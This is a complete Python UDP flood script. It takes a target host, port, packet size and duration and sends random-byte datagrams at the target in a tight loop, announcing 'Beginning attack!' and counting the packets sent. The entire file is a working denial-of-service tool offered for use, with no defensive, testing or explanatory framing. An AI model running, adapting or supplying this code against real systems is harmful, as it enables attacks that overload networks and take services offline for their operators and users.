import socket
import sys
import time
import random

try:
	sys.argv[4]
except Exception as e:
	print("[Error] Incorrect Usage!")
	print("\tCorrect usage: host port packetsize time")
	print("\tPlease Note: data cannot be separated by spaces!")
	quit()

class Attack:
	def __init__(self):
		self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		self.host = str(sys.argv[1])
		self.port = int(sys.argv[2])
		self.data = random._urandom(int(sys.argv[3]))
		self.time = float(sys.argv[4])
		print("[Info] Program Initialized!")
		print("[Info] Beginning attack!")
		self.attack()
	def attack(self):
		self.packets_sent = 0
		t1 = time.time()
		while True:
			self.sock.sendto(self.data, (self.host, self.port))
			t2 = time.time()
			if t2-t1 >= self.time:
				break;
			self.packets_sent += 1
		print("[Results]: {} packets sent!".format(self.packets_sent))
def main():
	Attack()

if __name__ == "__main__":
	main()
